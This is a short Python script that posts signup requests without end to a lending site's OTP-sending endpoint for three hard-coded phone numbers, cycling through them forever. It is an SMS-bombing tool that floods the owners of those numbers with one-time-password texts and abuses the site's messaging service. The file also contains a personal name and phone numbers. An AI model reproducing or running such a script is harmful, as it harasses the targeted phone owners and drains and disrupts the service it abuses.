from requests import post
import random
sdt = ['0977920301', '0866483402', '0973465073' ]
i=0
while True:
    phone = sdt[i]
    pload = {"name":"Tu Le Dang","phoneNumber":phone}
    r = post("https://webvay.vn/po/api/signup/sendOtp",json = pload)
    print(r)
    i+=1
    if i==len(sdt):
        i=0